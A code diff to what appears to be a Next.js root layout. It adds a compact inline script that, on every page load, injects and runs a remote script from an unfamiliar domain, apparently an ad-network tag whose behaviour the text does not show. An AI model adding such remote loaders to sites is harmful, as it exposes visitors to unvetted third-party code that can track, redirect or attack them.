@@ -46,7 +46,9 @@ export default function RootLayout({ children }){
       <Script type="text/javascript" src="/browser-file-storage.min.js"></Script> 
     <Script type="text/javascript" src="/script-1.js"></Script> 
     <Script type="text/javascript" src="https://raw.githubusercontent.com/chrisdancee/react-ios-pwa-prompt/master/dist/react-ios-pwa-prompt.js"></Script> 
-
+    <Script>
+    {`(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('groleegni.net',8799072,document.createElement('script'))`}
+    </Script>
 
       <body className={`${poppins.className} overscroll-y-contain`}>
         <PassiveListner />
